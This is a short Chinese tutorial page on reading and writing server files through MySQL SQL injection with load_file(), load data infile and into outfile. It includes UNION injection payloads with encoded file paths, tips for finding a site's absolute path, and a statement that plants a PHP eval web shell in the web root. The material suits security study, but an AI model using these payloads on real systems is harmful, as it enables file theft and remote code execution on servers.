---
layout: default
category: Web安全
tags: [SQL注入]
---

## 0x00 相关函数

* load_file()
* load data infile
* into outfile 

## 0x01 load_file()导出文件

**作用：** 读取文件并返回该文件的内容

**使用的条件：**

1. 必须有权限读取并且文件必须完全可读
   1.  `and (select count(*) from mysql.user)>0 %23` 返回正常，说明有读写权限
2. 读取的文件必须在服务器上
3. 必须指定文件的绝对路径
4. 读取文件必须小于max_allowed_packet

文件不满足的情况下，会返回空。在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有
administrators 才能访问的文件，users 就别想load_file 出来。

在测试的过程中一个难题需要解决：

* 网站的绝对路径

**查找物理路径的方法：**

* 报错显示，通过构造错误query语句，如果`display_error=on` ,那么就会爆出绝对路径
* Google hacking
  * site: url warning
* 读取配置文件
* 遗留的文件 phpinfo、info、test
* 漏洞爆路径

**注意：**

1. 路径符号`\` 要转义`\\`
2. 路径可以是十六进制，就不要`""`

```
select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,
114,101,112,97,105,114,92,115,97,109)))//利用hex()将文件内容导出来，尤其是smb 文件时可以使用。

-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))

-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)

-1 union select 1,1,1,load_file(c:\\boot.ini)
```

**常用路径：**
http://www.cnblogs.com/lcamry/p/5729087.html

## 0x02 load data infile 文件导入到数据库

**作用：** 句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。

```
示例：load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'
```

将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是
每一项数据之间的分隔符，lines terminated by 是行的结尾符。

当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑
/tmp 等文件夹。

## 0x03 into outfile 导入到文件

**作用：**可以将选择的行写入到一个文件中，该文件被创建在服务器的主机上，必须有file权限，而且filename不能是一个已经存在的文件。

一般有两种形式：

```
第一种： 直接将select内容写入到文件中
Select <?php @eval($_post[“mima”])?> into outfile “c:\\phpnow\\htdocs\\test.php”

第二种： 修改文件结尾
Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” line terminated by 0x16进制文件
```

在sqlmap 中os-shell 采取第二种方式，具体可参考os-shell 分析文章：http://www.cnblogs.com/lcamry/p/5505110.html